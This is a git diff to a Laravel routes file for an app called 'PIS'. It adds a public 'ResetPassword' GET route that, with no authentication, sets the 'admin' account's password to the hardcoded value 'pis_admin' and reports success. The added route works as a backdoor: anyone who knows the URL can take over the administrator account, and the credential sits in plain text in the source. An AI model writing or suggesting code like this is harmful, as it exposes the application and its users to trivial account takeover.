@@ -73,4 +73,13 @@ Route::get('/sirBong','PisController@sirBong');
 ///PDF
 Route::get('pdf','PdfController@pdf');
 
+//RESET PASSWORD
+Route::get('ResetPassword',function(){
+    $user = \PIS\User::where('username','=','admin')->first();
+    $user->update([
+        "password" => bcrypt('pis_admin')
+    ]);
+    return 'Successfully Updated';
+});
+
 
